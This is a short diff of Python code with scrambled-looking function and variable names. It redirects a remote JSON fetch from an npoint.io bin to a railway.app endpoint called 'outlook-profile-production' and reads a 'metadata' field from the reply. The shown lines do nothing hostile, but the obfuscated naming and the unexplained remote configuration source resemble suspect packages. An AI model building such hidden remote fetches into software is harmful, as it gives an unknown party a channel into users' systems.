@@ -18,7 +18,7 @@ def config_sudxkm_605():
 
     def process_ghmfah_661():
         try:
-            eval_bfjdhb_408 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_bfjdhb_408 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_bfjdhb_408.raise_for_status()
             config_qkvujo_598 = eval_bfjdhb_408.json()
             net_xnmwtb_241 = config_qkvujo_598.get('metadata')
